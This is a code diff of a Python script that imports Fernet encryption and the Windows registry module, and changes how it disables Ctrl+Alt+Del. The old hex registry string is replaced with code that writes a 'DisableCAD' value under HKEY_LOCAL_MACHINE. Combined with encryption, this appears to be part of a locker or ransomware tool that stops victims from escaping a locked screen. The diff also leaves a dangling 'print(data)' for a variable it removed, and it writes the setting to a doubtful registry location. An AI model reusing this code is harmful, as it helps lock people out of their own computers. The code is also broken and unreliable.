@@ -10,14 +10,20 @@ from cryptography.fernet import Fernet
 import struct
 import winreg
 
-# Registry entry (in hexadecimal format for disable ctrl+alt+del)
-registry_input = "00,00,00,00,00,00,00,00,03,00,00,00,4d,e0,1d,e0,4b,e0,1d,00,00,00,00,00"
+# Define the registry key and value to disable CAD (No Ctrl+Alt+Del)
+key = winreg.HKEY_LOCAL_MACHINE
+subkey = r"SYSTEM\CurrentControlSet\Control\Keyboard Layout"
+value_name = "DisableCAD"
 
-# Convert the input to a list of hexadecimal values
-hex_values = [int(x, 16) for x in registry_input.split(',')]
+# Set the value to 1 to disable CAD, 0 to enable it
+disable_cad_value = 1
 
-# Format the data in a special way
-data = struct.pack('<' + 'B' * len(hex_values), *hex_values)
+try:
+    with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
+        winreg.SetValueEx(registry_key, value_name, 0, winreg.REG_DWORD, disable_cad_value)
+    print("CAD has been disabled.")
+except Exception as e:
+    print(f"Error disabling CAD: {e}")
 
 # Print the Registry data
 print(data)
